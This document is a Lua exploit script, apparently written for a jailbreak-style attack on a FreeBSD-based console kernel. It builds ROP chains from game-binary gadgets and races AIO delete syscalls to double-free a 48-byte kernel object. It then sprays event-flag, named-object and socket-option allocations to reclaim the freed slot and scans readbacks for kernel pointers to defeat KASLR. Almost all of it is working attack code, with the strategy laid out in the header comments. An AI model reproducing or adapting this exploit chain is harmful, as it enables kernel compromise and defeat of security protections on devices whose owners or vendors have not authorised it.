-- CRASH_CLASS: HIGH
-- PROBE 69d: Target R object (48B) for KASLR via cross-subsystem reclaim
--
-- DECOMPILE FINDING (VERIFICATION_DECOMPILE.md, 2026-10-25):
--   R+0x00 = curthread+0x390 (kernel thread address)
--   R+0x08 = curthread+0x08  (kernel thread address)
--   R+0x10 = credential ref (ZEROED before free)
--   R is 0x30 bytes in zone 0x1ab59e0 -> maps to 64B UMA bucket
--   R is freed FIRST (before I), with +0x00 and +0x08 intact
--
-- STRATEGY:
--   1. Double-free R -> slot appears twice on zone free list
--   2. Spray with evf_create(538) and namedobj_create(557) to reclaim one copy
--   3. Submit new AIO -> new R allocation gets the same slot
--      -> R+0x00 and R+0x08 overwritten with fresh kernel thread pointers
--   4. Read back through spray interface (evf: 543 trywait, namedobj: 540 lookup)
--   5. If spray object's readback exposes bytes at R+0x00/R+0x08 -> KASLR defeat
--
-- ALTERNATIVE: spray first, then check if AIO submit overlaps the spray object
--   -> read the spray object for kernel pointer contamination

print("=== PROBE 69d: R-object KASLR via cross-subsystem reclaim ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- ============================================================
-- [A] BASELINE: evf_create and namedobj_create object sizes
-- ============================================================
print("[A] Probe evf_create(538) and namedobj_create(557) object sizes")

-- evf_create: 538(name_ptr, init_pattern)
-- Create several evfs and check sys 624 delta
local pre_624 = nil
pcall(function()
    pre_624 = mk(624)(uint64(0))
end)
print("  624 before evf: " .. (pre_624 and fmt(pre_624) or "nil"))

local evf_handles = {}
for i = 1, 32 do
    local nm = put_str(string.format("evf_%04d", i))
    local ret = nil
    pcall(function()
        ret = mk(538)(uint64(N(nm)), uint64(0x100))
    end)
    if ret then
        local h, l = get_hi_lo(ret)
        if l ~= 0xFFFFFFFF and (h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF) then
            table.insert(evf_handles, {handle = ret, name = nm})
        end
    end
end
print("  evf_create: " .. #evf_handles .. " handles")

local post_624 = nil
pcall(function()
    post_624 = mk(624)(uint64(0))
end)
print("  624 after evf: " .. (post_624 and fmt(post_624) or "nil"))

if pre_624 and post_624 then
    local d = N(post_624) - N(pre_624)
    print("  624 delta for " .. #evf_handles .. " evfs: " .. d)
    if #evf_handles > 0 then
        print("  624 per evf: " .. string.format("%.1f", d / #evf_handles))
    end
end

-- namedobj_create: 557(name_ptr) -> handle
local nobj_handles = {}
local pre_624b = nil
pcall(function() pre_624b = mk(624)(uint64(0)) end)

for i = 1, 32 do
    local nm = put_str(string.format("nobj_%04d", i))
    local ret = nil
    pcall(function()
        ret = mk(557)(uint64(N(nm)))
    end)
    if ret then
        local h, l = get_hi_lo(ret)
        if l ~= 0xFFFFFFFF and (h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF) then
            table.insert(nobj_handles, {handle = ret, name = nm})
        end
    end
end
print("  namedobj_create: " .. #nobj_handles .. " handles")

local post_624b = nil
pcall(function() post_624b = mk(624)(uint64(0)) end)

if pre_624b and post_624b then
    local d = N(post_624b) - N(pre_624b)
    print("  624 delta for " .. #nobj_handles .. " namedobjs: " .. d)
    if #nobj_handles > 0 then
        print("  624 per namedobj: " .. string.format("%.1f", d / #nobj_handles))
    end
end

if not alive() then print("DEAD after section A"); return end

-- Clean up evf and namedobj
for _, e in ipairs(evf_handles) do
    pcall(function() mk(539)(e.handle) end)
end
for _, n in ipairs(nobj_handles) do
    pcall(function() mk(558)(n.handle) end)
end

-- ============================================================
-- [B] DOUBLE-FREE + EVF SPRAY + AIO SUBMIT + EVF READBACK
-- ============================================================
print("")
print("[B] Double-free -> evf spray -> AIO submit -> evf trywait readback")

local ITERS = 10
local EVF_SPRAY = 64
local kptr_found = false

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit and poll BATCH AIO requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then
        print(string.format("  iter %d: only %d IDs, skip", iter, #ids))
        break
    end

    -- Set up concurrent delete arrays
    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Fire concurrent deletes (double-free)
    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    -- Count doubles
    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        if iter <= 3 then print(string.format("  iter %d: 0 doubles", iter)) end
    else
        -- STEP 1: Spray evfs to reclaim R slots (48B -> 64B bucket)
        local spray_evfs = {}
        for i = 1, EVF_SPRAY do
            local nm = put_str(string.format("s%d_%04d", iter, i))
            local ret = nil
            pcall(function()
                ret = mk(538)(uint64(N(nm)), uint64(0x4141414100000000 + i))
            end)
            if ret then
                local h, l = get_hi_lo(ret)
                if l ~= 0xFFFFFFFF then
                    table.insert(spray_evfs, ret)
                end
            end
        end

        -- STEP 2: Submit new AIO requests to overlap R slots
        -- New R allocations write kernel thread pointers at +0x00/+0x08
        local reclaim_count = doubles * 4 + 16
        if reclaim_count > 64 then reclaim_count = 64 end
        local new_ids = {}
        for i = 1, reclaim_count do
            local nid = submit_one()
            if nid ~= 0 then table.insert(new_ids, nid) end
        end

        -- STEP 3: Read back through evf poll (543)
        -- Confirmed ABI: 543(handle, bits, mode) — mode 1/2 = check if set
        -- ret=0 if bits set, ret=-1 if not. Return value itself may carry data.
        -- Also try 542(handle, bits, mode, result, timeout) — wait with result ptr
        local evf_anomalies = 0
        local evf_out = memory.alloc(16)
        for idx, eh in ipairs(spray_evfs) do
            -- 543 poll: mode=1 checks if any bit in mask is set
            local ret543 = nil
            pcall(function()
                ret543 = mk(543)(eh, uint64(0xFFFFFFFF), uint64(1))
            end)
            if ret543 then
                local h, l = get_hi_lo(ret543)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_found = true
                    print(string.format("  iter %d EVF543 KPTR: handle=%s ret=%s *** KASLR ***",
                        iter, fmt(eh), fmt(ret543)))
                end
                if l ~= 0 and l ~= 0xFFFFFFFF and l ~= 0x16 then
                    evf_anomalies = evf_anomalies + 1
                    if evf_anomalies <= 5 then
                        print(string.format("  iter %d EVF543 anom: handle=%s ret=%s",
                            iter, fmt(eh), fmt(ret543)))
                    end
                end
            end

            -- 542 wait: mode=1, result_ptr, timeout=0
            if idx <= 8 then
                wq(N(evf_out), uint64(0xDEADDEAD))
                wq(N(evf_out) + 8, uint64(0xDEADDEAD))
                pcall(function()
                    mk(542)(eh, uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_out)), uint64(0))
                end)
                local d0 = rd(N(evf_out)) or 0xDEADDEAD
                local d1 = rd(N(evf_out) + 4) or 0xDEADDEAD
                if d0 ~= 0xDEADDEAD and d0 ~= 0 then
                    evf_anomalies = evf_anomalies + 1
                    if d1 >= 0xFFFF8000 and d1 ~= 0xFFFFFFFF then
                        kptr_found = true
                        print(string.format("  iter %d EVF542 KPTR: 0x%08X%08X *** KASLR ***",
                            iter, d1, d0))
                    end
                end
            end
        end

        -- Clean up
        for _, nid in ipairs(new_ids) do
            pcall(function() poll_one(nid) end)
            pcall(function() delete_one(nid) end)
        end
        for _, eh in ipairs(spray_evfs) do
            pcall(function() mk(539)(eh) end)
        end

        print(string.format("  iter %d: doubles=%d spray=%d reclaim=%d evf_anom=%d",
            iter, doubles, #spray_evfs, #new_ids, evf_anomalies))
    end
end

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] DOUBLE-FREE + NAMEDOBJ SPRAY (48B names) + AIO SUBMIT
-- ============================================================
print("")
print("[C] Double-free -> namedobj spray (48B names) -> AIO submit -> lookup readback")

for iter = 1, 5 do
    if not alive() then break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  C iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles > 0 then
        -- Spray with namedobjs whose name buffers are ~48B
        -- Name = 47 chars + NUL = 48 bytes (targets 64B bucket)
        local spray_nobjs = {}
        for i = 1, 64 do
            -- 47-char name to get 48B allocation (fits 64B bucket)
            local name = string.format("AAAA%04d_SPRAY_%d_PADDING_TO_47_BYTES_%d_XX", i, iter, i)
            name = name:sub(1, 47)
            local nm = put_str(name)
            local ret = nil
            pcall(function()
                ret = mk(557)(uint64(N(nm)))
            end)
            if ret then
                local h, l = get_hi_lo(ret)
                if l ~= 0xFFFFFFFF then
                    table.insert(spray_nobjs, {handle = ret, name = name, nm_ptr = nm})
                end
            end
        end

        -- Submit new AIO to write R kernel pointers into reclaimed slots
        local new_ids2 = {}
        for i = 1, doubles * 4 + 16 do
            local nid = submit_one()
            if nid ~= 0 then table.insert(new_ids2, nid) end
        end

        -- Read back via namedobj lookup (540)
        -- 540(name_ptr) -> handle if found
        -- If the name buffer got corrupted by R's kernel pointers,
        -- we can detect it: lookup fails (name changed) or returns wrong handle
        local nobj_anomalies = 0
        for _, no in ipairs(spray_nobjs) do
            local ret2 = nil
            pcall(function()
                ret2 = mk(540)(no.nm_ptr)
            end)
            if ret2 then
                local h, l = get_hi_lo(ret2)
                local oh, ol = get_hi_lo(no.handle)
                if l ~= ol or h ~= oh then
                    nobj_anomalies = nobj_anomalies + 1
                    if nobj_anomalies <= 5 then
                        print(string.format("  C iter %d NOBJ mismatch: expected=%s got=%s",
                            iter, fmt(no.handle), fmt(ret2)))
                    end
                end
                if l == 0xFFFFFFFF and ol ~= 0xFFFFFFFF then
                    nobj_anomalies = nobj_anomalies + 1
                    print(string.format("  C iter %d NOBJ KILLED: name corrupted (kernel ptr overwrote name buffer)", iter))
                end
            end
        end

        -- Clean up
        for _, nid in ipairs(new_ids2) do
            pcall(function() poll_one(nid) end)
            pcall(function() delete_one(nid) end)
        end
        for _, no in ipairs(spray_nobjs) do
            pcall(function() mk(558)(no.handle) end)
        end

        print(string.format("  C iter %d: doubles=%d spray=%d nobj_anom=%d",
            iter, doubles, #spray_nobjs, nobj_anomalies))
    else
        if iter <= 2 then print(string.format("  C iter %d: 0 doubles", iter)) end
    end
end

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] SOCKET OPTION SPRAY (various sizes near 48B)
-- ============================================================
print("")
print("[D] Double-free -> setsockopt spray -> getsockopt readback")

-- Create a pool of TCP sockets for setsockopt spray
local sock_pool = {}
for i = 1, 64 do
    local ret = nil
    pcall(function()
        ret = mk(97)(uint64(2), uint64(1), uint64(6))
    end)
    if ret then
        local s = sgn(ret)
        if s >= 0 then table.insert(sock_pool, s) end
    end
end
print("  TCP socket pool: " .. #sock_pool)

-- Try one double-free + setsockopt(IP_OPTIONS) spray
-- IP_OPTIONS can set up to ~40 bytes of option data
-- Also try TCP_CCALGOOPT which takes a variable-size buffer
for iter = 1, 5 do
    if not alive() then break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  D iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles > 0 then
        -- Spray: setsockopt(IP_OPTIONS=1) with 40-byte payloads on each socket
        -- IP_OPTIONS allocates a mbuf or buffer on the heap
        local opt_buf = memory.alloc(0x40)
        for j = 0, 0x27 do wd(N(opt_buf) + j, 0x41 + (j % 26)) end

        local spray_ok = 0
        for _, fd in ipairs(sock_pool) do
            local ret = nil
            pcall(function()
                -- setsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, buf, 40)
                ret = mk(105)(uint64(fd), uint64(0), uint64(1), uint64(N(opt_buf)), uint64(40))
            end)
            if ret then
                local r = sgn(ret)
                if r == 0 then spray_ok = spray_ok + 1 end
            end
        end

        -- Submit AIO to overlap
        local new_ids3 = {}
        for i = 1, doubles * 4 + 16 do
            local nid = submit_one()
            if nid ~= 0 then table.insert(new_ids3, nid) end
        end

        -- Readback: getsockopt(IP_OPTIONS) on each socket
        local get_buf = memory.alloc(0x100)
        local get_len = memory.alloc(8)
        local sock_anomalies = 0

        for _, fd in ipairs(sock_pool) do
            for j = 0, 0xFC, 4 do wd(N(get_buf) + j, 0xDEADDEAD) end
            wd(N(get_len), 0x100)
            pcall(function()
                -- getsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, buf, &len)
                mk(118)(uint64(fd), uint64(0), uint64(1), uint64(N(get_buf)), uint64(N(get_len)))
            end)
            local got_len = rd(N(get_len)) or 0
            if got_len > 0 then
                -- Scan returned data for kernel pointers
                for off = 0, got_len - 4, 4 do
                    local hi = rd(N(get_buf) + off + 4) or 0
                    if hi >= 0xFFFF8000 then
                        local lo = rd(N(get_buf) + off) or 0
                        print(string.format("  D iter %d SOCKOPT KPTR: fd=%d off=%d val=0x%08X%08X *** KASLR ***",
                            iter, fd, off, hi, lo))
                        kptr_found = true
                        sock_anomalies = sock_anomalies + 1
                    end
                end
                -- Check for contamination (read qwords, compare with sentinel pattern)
                for off = 0, math.min(got_len, 40) - 8, 8 do
                    local v = rq(N(get_buf) + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh ~= 0 or (vl ~= 0 and vl ~= 0xDEADDEAD) then
                            sock_anomalies = sock_anomalies + 1
                            if sock_anomalies <= 3 then
                                print(string.format("  D iter %d SOCKOPT data: fd=%d off=%d val=%s",
                                    iter, fd, off, fmt(v)))
                            end
                        end
                    end
                end
            end
        end

        -- Clean up AIO
        for _, nid in ipairs(new_ids3) do
            pcall(function() poll_one(nid) end)
            pcall(function() delete_one(nid) end)
        end

        print(string.format("  D iter %d: doubles=%d spray_ok=%d/%d sock_anom=%d",
            iter, doubles, spray_ok, #sock_pool, sock_anomalies))
    else
        if iter <= 2 then print(string.format("  D iter %d: 0 doubles", iter)) end
    end
end

-- Close socket pool
for _, fd in ipairs(sock_pool) do
    pcall(function() mk(6)(uint64(fd)) end)
end

print("")
if kptr_found then
    print("*** KERNEL POINTER DETECTED — KASLR DEFEAT ***")
else
    print("No kernel pointers found in this run")
end
print("")
print("=== PROBE 69d COMPLETE ===")
